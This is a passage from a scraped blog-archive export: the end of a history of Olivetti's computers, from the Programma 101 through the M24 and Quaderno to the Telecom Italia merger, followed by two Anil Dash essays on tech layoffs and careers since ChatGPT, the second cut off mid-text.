government via ambassador Clare Boothe Luce to sell Olivetti's electric division to GE, Roberto turned to the Italian government for assistance. The Italian government didn't view computers as being of any national importance, and thus a bail out was rejected. New board members came in with cash and saved the company, but they favored a sale. Aurelio Peccei became CEO in 1964, and the Olivetti electronics division was sold to General Electric. This sale did not include the typewriter or calculator divisions, and Olivetti retained Underwood which became Olivetti-Underwood. Over the next few years, this would transform from liability to asset as it provided Olivetti access to the US market with established distribution networks.</p> <p>Front left: Pier Perotto, Front right: Giovanni De Sandre, Back left: Gastone Garziera, Back right: Giancarlo Toppi; inventors of the Programma 101</p> <p>Faggin's small computer was refined and adapted by Pier Perotto, Giovanni De Sandre, Gastone Garziera, and Giancarlo Toppi. It became a diminutive, simple, programmable, personal, desktop computer. Given the time, the entire system was built of discrete components: transistors, diodes, resistors, capacitors. For memory, the machine utilized 240 bytes of magnetostrictive, metal-wire, acoustic delay lines with a cycle time of 2.2 milliseconds. All of these components were then mounted on phenolic resin (commonly known as Bakelite) cards. Phenolic resin a was cheap, heat-resistant, nonconductive, synthetic plastic first patented in 1907. It was easy to mold and could be produced quite quickly. The major downsides were swelling under extreme humidity, difficulty in recycling, and toxicity. The material ceased being used with arrival of ABS and PVC.</p> <p>The only issue that remained for the small team was that this was a computer. Computers were strictly going to be the domain of GE and not of Olivetti. Given that this machine barely qualified as a computer, Garziera spent several nights going through all documentation and references to this product changing the description from computer to calculator. Olivetti was therefore able to keep it. Still, GE now owned the building and everything in that building except for the office in use by this team. The result of this close and uncomfortable proximity was that the four painted the windows on their office so that GE staff weren't able to see their activity.</p> <p>Programma 101</p> <p>Depending entirely on how loosely the definition of computer is used, the Programma 101 was either a programmable calculator or the first personal computer upon its release in 1965. Of course, just viewing the keyboard, the device appears to be a calculator rather than a computer, but this was also true of the KIM-1. The real limitation was in memory where a program of any complexity was nearly impossible.</p> <p></p> <p>The keyboard of the P101 was 37 keys, a decimal selector wheel of 0 to 15, and three switches for Program Record, Print Program, and Keyboard release. Input was achieved either through the keyboard or through magnetic cards, and output was achieved primarily through the printer. The \"display\" such as it was consisted only of two lamps. Solid blue indicated that the machine was ready for input, flashing blue indicated that a program was running, and a red lamp indicated an error. The printer was capable of 30 characters per second.</p> <p></p> <p>For all this talk of the machine being a computer, I did say that programs of any complexity were nearly impossible. Well, nearly impossible means that a thing actually is possible. A clever programmer could split a program across multiple magnetic cards and feed them sequentially as each part of a program was run. While this would have been slow, it was possible. Given that this sixty pound, typewriter-sized computer cost $3200 in 1965 which would be around $38,211 in 2025 dollars, someone needing a computer without requisite funds for a larger machine would find this inconvenience acceptable. We know this, of course, from sales.</p> <p>Olivetti advert</p> <p>The total initial production run of the Programma 101 was 44,000 units. The public unveiling of this \"calculator\" was at the World's Fair in New York City during the Fair's second season in 1965. The intended star of Olivetti's showing was the Logos 27, another of their mechanical calculators. The P101 was in a small backroom, and Olivetti's management hadn't really thought it'd receive much attention. The presenter of the P101 informed the audience that he'd be calculating the orbit of a satellite, put the card in the machine, and after a few seconds the computer began printing the result. There was quite a bit of excitement. The P101 was moved to the front of the booth. Fair attendees assumed that there must be hidden wires connecting it to a mainframe offsite, and thus the Olivetti representatives began allowing people a closer look. Following the fair, Olivetti sold 40,000 units in the USA alone. Some of these went to NASA where the humble little machines were used for Apollo 11, as David W. Whittle recalls:</p> <p>By Apollo 11, we had a desktop computer, sort of, kind of, called an Olivetti Programma 101. It was kind of a supercalculator. It was probably a foot and a half square, and about maybe eight inches tall. It would add, subtract, multiply, and divide, but it would remember a sequence of these things, and it would record that sequence on a magnetic card, a magnetic strip that was about a foot long and two inches wide. So you could write a sequence, a programming sequence, and load it in there, and then if you would--the Lunar Module high-gain antenna was not very smart. It didn't know where Earth was. So you would have to call up and give the astronauts some--we had two knobs, a pitch and yaw knob, but you have to give him some angles to put it at. Then once the antenna found the Earth's signal, it would track it, and then you didn't have to worry. But it had to get within a certain range before it would grab it and track it.</p> <p>We would have to run four separate programs on this Programma 101, and then in between those programs, we'd have to get out our manuals. I don't know if you know what a CRC [Standard Mathematical Tables and Formulae] Manual is, but we'd have to look up trigonometric functions and input the data, which today your calculator does that. So what was taking us ten or fifteen minutes to do, today I could do on my hand calculator in ten seconds. Then we would read out the angles that we came up with to the crew, and they would dial them in, look at the signal strength, the signal strength there. They'd go to auto track, and then they could track it. It was a lot of detail stuff like that. I don't remember any, not just in my systems but other systems, anything that was significant.</p> <p>The company's fortunes improved, and Peccei left the company in 1967. Roberto Olivetti then returned as CEO until 1971. After 1971, he remained as the VP and chairman. Between 1965 and 1971, the Programma 101 represented around 24% of Olivetti's global revenues with that single product bringing in at least $140,800,000. Perotto and his team, with the support of Roberto, likely saved Olivetti.</p> <p>Olivetti P602</p> <p>The P101 was followed by the P602 in 1971, and it was the first Olivetti computer to be marketed as a microcomputer. It used the same architecture as the P101, but used DTL ICs instead of discrete components. It retained the use of delay line memory but doubled the size. One major addition was the system ROM which added trigonometric, logarithmic, and exponential functions. A second addition was an interface for magnetic ribbon memory cartridges holding 56, 112, or 224 blocks where a block was equivalent to four lines of a magnetic card. Finally, the P602 added the IPSO interface (Olivetti Standard Peripheral Interface) allowing the connection of tape readers, punches, plotters, typewriters, hard disks, and other peripherals. This was followed by the P652 which increased memory to 4K and could be expanded to 32K. It also included an integrated magnetic card that could store 192K.</p> <p>Olivetti Divisumma 18, image from vintage-calculator.com</p> <p>The Divisumma 18 was released in 1972 and was the design of Mario Bellini. This calculator lacked a display and printed all results. The main calculator and printer body was 9.75 inches by 4.75 inches by 2 inches, and after attaching the battery pack, that length was increased to 12.1 inches. While this product didn't bring in tons of revenue, and it wasn't all too important in the history of computing, its design is so wild that I had to mention it.</p> <p>Olivetti released the TC 800 terminal in 1974. This used a two-card Olivetti designed processor and ran the Cosmos operating system. It was followed by the TC 1800 in 1977. Perotto didn't really seem to want to make terminals, so the same CPU and other internals made their way into the P6060 in 1975. The first and most obvious difference is the keyboard, which is finally a full QWERTY keyboard with a 10-key and some extra keys for specific functions. RAM is 48K with 16K available to the user and an access time of 700ns. The ROM loader is made of bipolar LSI circuits and once loaded into RAM occupies the other 32K. Total RAM could be expanded to allow up to 48K of user-available RAM. The printer is now larger, and the system included a plasma display capable of displaying a single line of 32 characters (upper and lower case characters as well as symbols). That line on the screen could be \"scrolled\" up and down over a buffer of 80 characters. IPSO peripheral compatibility was maintained, but the P6060 included two eight inch floppy disk drives of 256K, and RS242 and IEEE-488 connectors. One additional accessory was a VDU for use with CRT displays. Software was significantly different as this machine shipped with BASIC, and the printer supported all characters and graphics supported by the system itself as well as framing, scaling, offsetting, axis drawing, and labeling. With these two advantages, the P6060 would have been of great use to anyone needing to create reports or other office documents.</p> <p>In the later part of the 1970s, Olivetti had around 62,000 employees, around $1.8 billion in revenue (around $9 billion in 2025 dollars), but even more debt with the company losing around $10 million each month. This debt was large enough and expensive enough that the brothers Carlo and Franco De Benedetti were able to purchase 14% of the company for just $17 million. This gave Olivetti, at this time, a valuation of just $121.42 million. It is rather difficult for me to imagine the ire that Olivetti's prior investors must have felt, but yet, the company could continue.</p> <p>Carlo De Benedetti was born on the 14th of November in 1934 in Turin. He's of Jewish descent, and like Adriano, fled Italy for Switzerland during the Second World War. After the war, he returned to Italy, earned his bachelor's degree in electrical engineering from the Polytechnic University of Turin, and then went to work in his father's business. He did well there, grew the company profits, and led the acquisition of another company. He was then CEO of the combined company until 1976 when he became the CEO of CIR Group, a position he held until 1978 when he became the CEO of Olivetti. Throughout his life, when political turmoil struck Italy, he went to Switzerland. Later in his life, he attained Swiss citizenship. Just prior to the Olivetti acquisition, he was living there with his wife and three sons.</p> <p>De Benedetti sought to completely reorganize the company and change its focus from typewriters to microcomputers. Nearly all of the company's senior management and nearly all of the company's board members threatened to leave. De Benedetti then met with each person individually and thoroughly explained his reasoning. He was successful in persuading them, and the mass resignations never occurred. Much of his plan centered on ending the generous employee benefit programs, cutting mechanical typewriters, renegotiating union contracts, and layoffs totaling a little over 22,000 personnel. De Benedetti's Olivetti also purchased small stakes in various other companies providing access to more markets, lower parts costs, and access to research.</p> <p>The company's office supply business was still going strong with electronic typewriters and calculators bringing in revenue. To this, Olivetti added copiers, and the company expanded into cash registers and ATM machines.</p> <p>Olivetti M20 magazine advertisement</p> <p>In 1979, the work on a new computer began at the Olivetti Advanced Technology Center in Cupertino. This machine was built around the Zilog Z8001 at 4MHz, 128K base RAM expandable to 512K, two 5.25 inch floppy disk drives supporting 320K floppies, and the Hitachi HD46505 CRTC. For expansion, the M20 offered IEEE-488, RS232-C, and two internal expansion slots. The computer was offered with various upgrades: higher capacity FDDs, memory, a 9.2MB HDD (and accompanying controller card), Corvus Omninet LAN, and a while after release an 8086 CPU card. The choice of the 46505 meant that this machine was vaguely compatible with IBM's MDA, but that was the only piece of this machine to offer any such compatibility until the release of the Alternate Processor Board (APB, the 8086 card mentioned previously). The M20's display output was 512 by 256 pixels, and all display modes were graphical. The computer was capable of producing eight colors when using two 32K video memory boards, but this dropped to just four colors from a palette of eight when using a single video memory board. The key advantage for Olivetti in this display setup was that it could support text at 80 by 25 or 64 by 16, and it could more easily support the various languages of Europe.</p> <p>Given that this machine was initially designed around the Z8001, it lacked a native operating system at the time of design. This was solved with the Professional Computer Operating System or PCOS-8000. This was a single-user, single-tasking, command driven operating system not too dissimilar from CP/M or MS-DOS. Its commands, however, were quite different. For example, <code>vf 1:</code> would format the disk in the left-most disk drive while <code>fl</code> would list the contents of a file. The lack of software for PCOS was well understood, and thus, a CP/M emulator was made available and it was often bundled with dBase II, SuperCalc, and other common software products. The M20 was released in 1982, and it sold well. The turn around had started and Olivetti reported positive net income for 1982 with positive earnings per share around 22\u00a2.</p> <p>Olivetti M24 press image</p> <p>De Benedetti wanted Olivetti computers to have much wider distribution than the company could achieve on its own. In particular, he wanted the company to have broad access to the American market. The first step to this was a truly IBM compatible machine; the company created the M24. The machine was built around an 8MHz 8086 with an optional 8087, 128K RAM expandable to 640K, and a CGA compatible video card that was actually better than plain old CGA. The video card supported 320 by 200, 640 by 200, and 640 by 400 with up to sixteen colors, and it supported an additional mode of 512 by 256 with eight colors. That last mode could be paired with a Z8001 card giving the M24 compatibility with the M20. For ports, the machine had RGB out (25pin), parallel, RS232 (25pin), and a proprietary 9pin DSUB keyboard connector. Later models added another 9pin connector on the keyboard for the attachment of a mouse, and added support in BIOS for 3.5 inch FDDs.</p> <p>Olivetti M24 magazine advertisement</p> <p>M24 motherboard, expansion board, and video card</p> <p>The M24 had seven 8bit ISA slots for internal expansion, but four of these came populated with a second adapter allowing for 16bit cards to be added. The expansions were on a separate board from both the video card and motherboard, and this is where things get\u2026 weird. The motherboard was underneath the expansion board and video card, physically separated from them, and mounted upside-down. The motherboard and expansion board then had edge connectors that slotted into the video card which was mounted vertically. Various configurations of this machine were launched in 1983. All of them featured a twelve inch monitor and 5.25 inch 360K floppy disk drive, but that monitor could be green or amber monochrome, or it could be color. Each monitor combination could then be paired with an optional 20MB HDD. The highest end configuration with HDD and color monitor would feature a video card capable of sixteen colors at 640 by 400, while the lower end variants all included a video card capable of just two colors at the same resolution. From what I can tell, the 8087 was available for all models. Pricing on the base model from Docutel/Olivetti in Texas started at $2745 while a more well equipped machine started at $3395.</p> <p>On the software side of things, the M24 initially shipped with MS-DOS 2.1, a diagnostic program, keyboard drivers, utilities, OLIMENU (TSR GUI similar to TopView), and GW BASIC. Versions of Windows 1 and Windows 2 were available for the M24, and it was supported by Windows 3.0. Given the machine's compatibility prowess, it could also run CP/M-86, UCSD-P, COHERENT, and XENIX.</p> <p>Olivetti M10, image from storiaolivetti.it</p> <p>In 1983, Olivetti released their first laptop. This was largely the same machine as the TRS-80 Model 100, but it had a physical redesign with a tilting screen. Base RAM was 8K and expandable to 32K. While the Model 100 was a success, the M10 was not. The machine was discontinued after two years.</p> <p>The US Department of Justice and the American Telephone and Telegraph company (AT&amp;T) agreed on a plan to breakup AT&amp;T on the 8th of January in 1982. That plan would be executed on the 1st of January in 1984. Seeing the loss of revenue from phone rentals on the horizon, AT&amp;T needed new revenue sources, and they needed them as quickly as possible. The attitude within AT&amp;T was quite clear with signs in the company's offices in 1983 reading with variations on:</p> <p>There are two giant entities at work in our country, and they both have an amazing influence on our daily lives \u2026 one has given us radar, sonar, stereo, teletype, the transistor, hearing aids, artificial larynxes, talking movies, and the telephone. The other has given us the Civil War, the Spanish-American War, the First World War, the Second World War, the Korean War, the Vietnam War, double-digit inflation, double-digit unemployment, the Great Depression, the gasoline crisis, and the Watergate fiasco. Guess which one is now trying to tell the other one how to run its business?</p> <p>AT&amp;T knew that the products built upon the company's many innovations in technology were generating large sums of money, and now freed of its legal prohibition from entering the computer market, it wanted to capitalize on those innovations. The company simply didn't have the time to do this on its own. The M24 was quickly successful in Europe, was a great product, and it beat the IBM PC and XT, competing well with the Compaq Deskpro. Olivetti, meanwhile, needed cash and more market access. On the 21st of December in 1983, AT&amp;T announced the purchase of 100 million shares of Olivetti for $4.26 million. This made AT&amp;T the single largest shareholder at 25% while De Benedetti maintained 15%. Olivetti was now able to market AT&amp;T products in Europe, and AT&amp;T could market Olivetti products in the USA.</p> <p>Because of this deal, most people in the USA wouldn't know the M24 as an Olivetti. Had an American used an M24, it would likely have been the AT&amp;T PC 6300 (or less commonly the Xerox 6060, or in France as the Persona 1600 by LogAbax). The 6300 saw a revision in October of 1985 as the 6300 Plus featuring a 6MHz 80286, and this machine could run MS-DOS and UNIX System V concurrently via Simultask. The M24 saw a revision in November 1985 as the M24 SP with a 10MHz 8086. By 1986, Olivetti was the market leader in Europe and the third largest PC manufacturer on Earth. Unfortunately for AT&amp;T the 6300 Plus was a market failure. In late 1986, AT&amp;T ceded all production and development of its PC products to Olivetti.</p> <p>Olivetti Prodest PC 128S, image from computinghistory.org.uk</p> <p>The British computer market had been somewhat impenetrable for outsiders, but one prominent maker was struggling, Acorn. On the 20th of February in 1985, Olivetti purchased nearly half of Acorn Computers giving the company immediate access to the UK and an astounding amount of technology. One of the first fruits of this acquisition was the Prodest PC 128S which was an Italian localized BBC Master Compact.</p> <p>Olivetti M28, from brochure found at olivrea.de</p> <p>The Olivetti M28 was introduced in late 1986 as an AT competitor. It shipped with an Intel 80286 clocked at 8MHz, up to 1MB of RAM (expandable to 7MB), a 5.25 inch floppy disk drive supporting 1.2MB disks, a 20MB to 70MB HDD, and MS-DOS 3.2 or XENIX. The M28 continued to use Olivetti's enhanced CGA card, and it allowed more expansion options than its predecessor. Pricing started at around $3000, and it was offered in North America as the AT&amp;T PC 6310 and in France as the Persona 1800.</p> <p>One of Olivetti's largest competitors in Europe was Triumph-Adler (owner of Pertec, MITS, Omnidata). On the 22nd of April in 1986, Olivetti purchased 98.4% of Triumph-Adler and became the largest office supply company in Europe and held more than 50% of the typewriter market.</p> <p>From 1987 to 1994, Olivetti produced five distinct lines of workstation machines. The 3000 series (1987) utilized the Motorola 68000 (likely through Thomson or SGS-Thomson with whom Olivetti still maintained various partnerships) and later the Edge Computer variants of the 68000, the 4000 series (1992) utilized the Intel i860 or Motorola depending upon the specific model, the 5000 series (1990) utilized the Intel 486 and later the Pentium, the 6000 series (1991) utilized MIPS, and the 7000 series (1994) utilized DEC Alpha. The early systems shipped with X/OS which was, mostly, 4.2BSD. Later models shipped with Xenix, NT, or VMS depending upon the CPU in use.</p> <p>Iterations of Acorn machines, rebadged Thomson machines, and Olivetti's own M28 followed until roughly 1994.</p> <p>Olivetti Quaderno PT-XT-20, from Museo nazionale della scienza e della tecnologia Leonardo da Vinci</p> <p>The Olivetti Quaderno (PT-XT-20) was released in 1992 with an NEC V30 running at 16MHz, 1MB of RAM, a 20MB 2.5 inch HDD, PCMCIA, and MS-DOS 5. The display was an LCD with four levels of gray and a resolution of 640 by 400. It ran on six AA batteries. While visually awesome, the most incredible aspect was the machine's size: 8.27 inches by 5.83 inches by 1.26 inches. Despite having diminutive dimensions the machine contained a sound controller with both input and output and had a built in microphone, a fax modem, serial, parallel, video out, PS/2 keyboard/mouse, and some bundled productivity software. Interestingly, Olivetti made this Quaderno capable of acting as an answering machine. The machine won awards for design but was ridiculed for having very little computing power.</p> <p>Olivetti Quaderno 33, PT-AT-60</p> <p>To overcome the deficiencies of the prior model, Olivetti quickly released the Quaderno 33 (PT-AT-60). This machine utilized a 20MHz AMD 386SXLV, 4MB of RAM, a 60MB HDD, and a backlit, seven inch LCD capable of sixteen gray levels at 640 by 480. This model further featured Windows 3.1, Microsoft Works, and Lotus Organizer. The AAs were gone and power came from nickel-cadmium cells. Combined with power management features, this little laptop could manage six hours of operation per charge.</p> <p>In September of 1994, Olivetti launched Olivetti Telemedia chaired by Elserino Piol. This company then formed a joint venture with Bell Atlantic called Omnitel Pronto Italia with Francesco Caio as CEO. They went on to form Italy's second GSM mobile network, first privately held, launched in December of 1995. The company had 300,000 subscribers within its first six months of operation.</p> <p>Olivetti Envision magazine advertisement</p> <p>With the arrival of the CD-ROM, the Pentium, great sound, and high resolution displays, the PC was becoming a multimedia powerhouse. Olivetti saw an opportunity to conquer the living room as they'd once conquered the office. The company sought to create a computing appliance that would deliver audio, video, fax, and a telephone answering machine to the buyer. The product was the Olivetti Envision released in 1995. There were two models with either a 486DX4 at 100MHz or a Pentium at 75MHz. Both were equipped with 8MB of RAM, a Trident TGV9470 with 1MB of video RAM capable of 1024 by 768 with 256 colors, a Crystal CS4231 audio controller paired and an Oak Mozart OTI 605 (Adlib compatible but with an IDE CD-ROM controller), a 1.4MB 3.5 inch FDD, 635MB HDD, CD-ROM, an infrared remote, and an 83key keyboard with an integrated trackball operating over infrared. For external connectors, the Envision featured two SCART ports, audio out, MIDI, VGA out, serial, parallel, and RJ11. Internally, the machine had three expansion slots, and a satellite TV decoder card was available. The Envision could operate in three distinct modes. The first was as a true entertainment device with the remote where a user could control volume, play audio or video CDs, and view photos stored on CDs. The second was with the keyboard where the user navigated the Olipilot shell over Windows 95. The third mode was as a standard Windows PC. The Envision was largely a failure. It was expensive (especially with a Pentium), and it had quite a few bugs.</p> <p>Olivetti had some rather serious issues during the early 1990s. Competition in the PC market, printer market, and copier market were leading to high R&amp;D costs and forcing the company to accumulate debt. In 1991, the Italian economy went into an inflationary recession, and the government announced austerity measures. Olivetti had been profitable for thirteen consecutive years, but posted a pretax loss of $59 million for the first half of the year on the 11th of November in 1991 following four years of declining revenues. De Benedetti stated to the New York Times that he'd \"reassume the direct and complete management\" of the company. By 1996, the company had laid off roughly 28,000 people, more than half of their 1989 headcount.</p> <p>In June of 1996, De Benedetti resigned as CEO and Corrado Passera briefly filled the role. He was then replaced by Francesco Caio on the 4th of July. De Benedetti resigned as chairman on the 3rd of September (though he retained 14% of the company through his company CIR). On the 18th of September, Olivetti held an emergency board meeting and fired Caio. The board appointed Roberto Colaninno as replacement. Several former executives, including De Benedetti, were under investigation by Italian authorities for having understated the losses of Olivetti after Renzo Francesconi who'd only been CFO for six weeks resigned in late August and promptly accused the company of financial impropriety. When the dust settled and investigations ended, no one was ever formally charged with any crime.</p> <p>On the 12th of March in 2003, Marco Tronchetti Provera, who was chairman of both Telecom Italia and Olivetti, announced his intention to merge the two companies, a move apparently engineered by Colaninno. Olivetti took 51% of Telecom Italia's shares, and the combined entity became the TIM group.</p> <p>I've omitted many computers and the stories of many people. Partially this is due to length, and partially due to sources, language barriers, and the fact that many weren't too interesting. I apologize to those whose stories were left out, and I'm sorry if I didn't cover your favorite machine.</p> <p>Olivetti's history can be divided into three distinct parts. First, there were typewriters. As the crisis of this first era mounted, the company moved into microcomputers for its second era. With the IBM PC dominating the world, the company moved into its PC era. When this era came into crisis, the company ultimately ended in a merger, and that entity became a telco. Olivetti was an impressive company that achieved greatness. It was cut down by the same forces that affected so many others. The race to the bottom in PC pricing meant that only the most efficient manufacturers remained standing.</p> <p>My dear readers, many of you worked at, ran, or even founded the companies I cover here on ARF, and some of you were present at those companies for the time periods I cover. A few of you have been mentioned by name. All corrections to the record are sincerely welcome, and I would love any additional insights, corrections, or feedback (especially for this article as I suck at Italian). Please feel free to leave a comment.</p>"},{"location":"anildash.com/","title":"anildash.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>500,000 tech workers have been laid off since ChatGPT was released</li> <li>How the hell are you supposed to have a career in tech in 2026-</li> <li>They have to be able to talk about us without us</li> <li>Vibe Coding- Empowering and Imprisoning</li> <li>What about \u201cNothing about us without us-\u201d</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"anildash.com/500%2C000%20tech%20workers%20have%20been%20laid%20off%20since%20ChatGPT%20was%20released/","title":"500,000 tech workers have been laid off since ChatGPT was released","text":"<p>\u6765\u6e90: anildash.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://anildash.com/2026/01/06/500k-tech-workers-laid-off/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://anildash.com/', 'value': '<p>One of the key points I repeated when talking about the state of the tech industry yesterday was the salient fact that half a million tech workers have been laid off since ChatGPT was released in late 2022. Now, to be clear, those workers haven\u2019t been laid off because their jobs are now being done by AI, and they\u2019ve been replaced by bots. Instead, they\u2019ve been laid off by execs who now have AI to use as an excuse for going after workers they\u2019ve wanted to cut all along.</p>\\n<p>This is important to understand for a few reasons. First, it\u2019s key just for having empathy for both the mindset and the working conditions of people in the tech industry. For so many outside of tech, their impression of what \u201ctech\u201d means is whatever is the most recent transgression they\u2019ve heard about from the most obnoxious billionaire who\u2019s made the news lately. But in many cases, it\u2019s the rank and file workers at that person\u2019s company who were the first victims of that billionaire\u2019s ego.</p>\\n<p>Second, it\u2019s important to understand the big tech companies as almost the testing grounds for the techniques and strategies that these guys want to roll out on the rest of the economy, and on the rest of the world. Before they started going on podcasts pretending to be extremely masculine while whining about their feelings, or overtly bribing politicians to give them government contracts, they beta-tested these manipulative strategies within their companies by cracking down on dissent and letting their most self-indulgent and egomaniacal tendencies run wild. Then, when people (reasonably!) began to object, they used that as an excuse to purge any dissenters for being uncooperative or \u201cdifficult\u201d.</p>\\nIt starts with tech, but doesn\u2019t end there\\n<p>These are tactics they\u2019ll be bringing to other industries and sectors of the economy, if they haven\u2019t already. Sometimes they\u2019ll be providing AI technologies and tools as an enabler or justification for the cultural and political agenda that they\u2019re enacting, but often times, they don\u2019t even need to. In many cases, they can simply make clear that they want to enforce psychological and social conformity within their organizations, and that any disagreement will not be tolerated, and the implicit threat of being replaced by automation (or by other workers who are willing to fall in line) is enough to get people to comply.</p>\\n<p>This is the subtext, and sometimes the explicit text, of the deployment of \u201cAI\u201d in a lot of organizations. That\u2019s separate from what actual AI software or technology can do. And it explains a lot of why the majority AI view within the tech industry is nothing like the hype cycle that\u2019s being pushed by the loudest voices of the big-name CEOs.</p>\\n<p>Because people who work in tech still believe in the power of tech to do good things, many of us won\u2019t just dismiss outright the possibility that any technology \u2014 even AI tools like LLMs\\xa0\u2014 could yield some benefits. But the optimistic takes are tempered by the first-hand knowledge of how the tools are being used as an excuse to sideline or victimize good people.</p>\\n<p>This wave of layoffs and reductions has been described as \u201cpursuing efficiencies\u201d or \u201cright-sizing\u201d. But so many of us in tech can remember a few years back, when working in tech as an upwardly-mobile worker with a successful career felt like the best job in the world. When many people could buy nice presents for their kids at Christmas or they weren\u2019t as worried about your car payments. When huge parts of society were promising young people that there was a great future ahead if they would just learn to code. When the promise of a tech career\u2019s potential was used as the foundation for building infrastructure in our schools and cities to train a whole new generation of coders.</p>\\n<p>But the funders and tycoons in charge of the big tech companies knew that they did not want to keep paying enormous salaries to the people they were hiring. They certainly knew they didn\u2019t want to keep paying huge hiring bonuses to young people just out of college, or to pay large staffs of recruiters to go find underrepresented candidates. Those niceties that everybody loved, like great healthcare and decent benefits, were identified by the people running the big tech companies as \u201cmarket inefficiencies\u201d which indicated some wealth was going to you that should have been going to them. So yes, part of the reason for the huge investment in AI coding tools was to make it easier to write code. But another huge reason that AI got so good at writing code was so that nobody would ever have to pay coders so well again.</p>\\n<p>You\u2019re not wrong if you feel angry, resentful and overwhelmed by all of this; indeed, it would be absurd if you didn\u2019t feel this way, since the wealthiest and most powerful people in the history of the world have been spending a few years trying to make you feel exactly this way. Constant rotating layoffs and a nonstop fear of further cuts, with a perpetual sense of precarity, are a deliberate strategy so that everyone will accept lower salaries and reduced benefits, and be too afraid to push for the exact same salaries that the company could afford to pay the year before.</p>\\nWhy are we stirring the pot?\\n<p>Okay, so are we just trying to get each other all depressed? No. It\u2019s just vitally important that we name a problem and identify it if we\u2019re going to solve it.\\n\\u2028Most people outside of the technology industry think that \u201ctech\u201d is a monolith, that the people who work in tech are the same as the people who own the technology companies. They don\u2019t know that tech workers are in the same boat that they are, being buffeted by the economy, and being subject to the whims of their bosses, or being displaced by AI. They don\u2019t know that the DEI backlash has gutted HR teams at tech companies, too, for example. So it\u2019s key for everyone to understand that they\u2019re starting from the same place.</p>\\n<p>Next, it\u2019s key to tease apart things that are separate concerns. For example: AI is often an excuse for layoffs, not the cause of them. ChatGPT didn\u2019t replace the tasks that recruiters were doing in attracting underrepresented candidates at big tech companies \u2014 the bosses just don\u2019t care about trying to hire underrepresented candidates anymore! The tech story is being used to mask the political and social goal. And it\u2019s important to understand that, because otherwise people waste their time fighting battles that might not matter, like the deployment of a technology system, and losing the ones that do, like the actual decisions that an organization is making about its future.</p>\\nAre they efficient, though?\\n<p>But what if, some people will ask, these companies just had too many people? What if they\u2019d over-hired? The folks who want to feel really savvy will say, \u201cI heard that they had all those employees because interest rates were low. It was a Zero Interest Rate Phenomenon.\u201d This is, not to put too fine a point on it, bullshit. It\u2019s not in any company\u2019s best interests to cut their staffing down to the bone.</p>\\n<p>You actually need to have some reserve capacity for labor in order to reach maximum output for a large organization. This is the difference between a large-scale organization and a small one. People sitting around doing nothing is the epitome of waste or inefficiency in a small team, but in a large organization, it\u2019s a lot more costly if you are about to start a new process or project and you don\u2019t have labor capacity or expertise to deploy.</p>\\n<p>A good analogy is the oft-cited need these days for people to be bored more often. There\u2019s a frequent lament that, because people are so distracted by things like social media and constant interruptions, they never have time to get bored and let their mind wander, and think new thoughts or discover their own creativity. Put another way, they never get the chance to tap into their own cognitive surplus.</p>\\n<p>The only advantage a large organization can have over a small one, other than sheer efficiencies of scale, is if it has a cognitive surplus that it can tap into. By destroying that cognitive surplus, and leaving those who remain behind in a state of constant emotional turmoil and duress, these organizations are permanently damaging both their competitive advantages and their potential future innovations.</p>\\nAI Spring\\n<p>When the dust clears, and people realize that extreme greed is never the path to maximum long-term reward, there is going to be a \u201cpeace dividend\u201d of sorts from all the good talent that\u2019s now on the market. Some of this will be smart, thoughtful people flowing to other industries or companies, bringing their experience and insights with them.</p>\\n<p>But I think a lot of this will be people starting their own new companies and organizations, informed by the broken economic models, and broken human models, of the companies they\u2019ve left. We saw this a generation ago after the bust of the dot-com boom, when it was not only revealed that the economics of a lot of the companies didn\u2019t work, but that so many of the people who had created the companies of that era didn\u2019t even care about the markets or the industries that they\u2019d entered. When the get-rich-quick folks left the scene, those of us who remained, who truly loved the web as a creative and expressive medium, found a ton of opportunity in being the little mammals amidst the sad dinosaurs trying to find funding for meteor dot com.</p>\\nWhat comes next\\n<p>I don\u2019t think this all gets better very quickly. If you put aside the puffery of the AI companies scratching each others\u2019 backs, it\u2019s clear the economy is in a recession, even if this administration\u2019s goons have shut down reporting on jobs and inflation in a vain attempt to hide that reality. But I do think there may be more resilience because of the sheer talent and entrepreneurial skill of the people who are now on the market as individuals.</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:11</p>"},{"location":"anildash.com/How%20the%20hell%20are%20you%20supposed%20to%20have%20a%20career%20in%20tech%20in%202026-/","title":"How the hell are you supposed to have a career in tech in 2026?","text":"<p>\u6765\u6e90: anildash.com \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://anildash.com/2026/01/05/a-tech-career-in-2026/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://anildash.com/', 'value': '<p>The number one question I get from my friends, acquaintances, and mentees in the technology industry these days is, by far, variations on the basic theme of, \u201cwhat the hell are we supposed to do now?\u201d</p>\\n<p>There have been mass layoffs that leave more tech workers than ever looking for new roles in the worst market we\u2019ve ever seen. Many of the most talented, thoughtful and experienced people in the industry are feeling worried, confused, and ungrounded in a field that no longer looks familiar.</p>\\n<p>If you\u2019re outside the industry, you may be confused \u2014 isn\u2019t there an AI boom that\u2019s getting hundreds of billions of dollars in investments? Doesn\u2019t that mean the tech bros are doing great? What you may have missed is that half a million tech workers have been laid off in the years since ChatGPT was released; the same attacks on marginalized workers and DEI and \u201cwoke\u201d that the tech robber barons launched against the rest of society were aimed at their own companies first.</p>\\n<p>So the good people who actually make the technology we use every day, the real innovators and creators and designers, are reacting to the unprecedented disconnect between the contemporary tech industry and the fundamentals that drew so many people toward it in the first place. Many of the biggest companies have abandoned the basic principle of making technology that actually works. So many new products fail to deliver on even the basic capabilities that the companies are promising that they will provide.</p>\\n<p>Many leaders at these companies have run full speed towards moral and social cowardice, abandoning their employees and customers to embrace rank hatred and discrimination in ways that they pretended to be fighting against just a few years ago. Meanwhile, unchecked consolidation has left markets wildly uncompetitive, leaving consumers suffering from the effects of categories without any competition or investment \u2014 which we know now as \u201censhittification\u201d. And the full-scale shift into corruption and crony capitalism means that winners in business are decided by whoever is shameless enough to offer the biggest bribes and debase themselves with the most humiliating display of groveling. It\u2019s a depressing shift for people who, earlier in their careers, often actually were part of inventing the future.</p>\\n<p>So where do we go from here?</p>\\nYou\u2019re not crazy.\\n<p>The first, and most important, thing to know is that it\u2019s not just you. Nearly everyone in tech I have this conversation with feels very isolated about it, and they\u2019re often 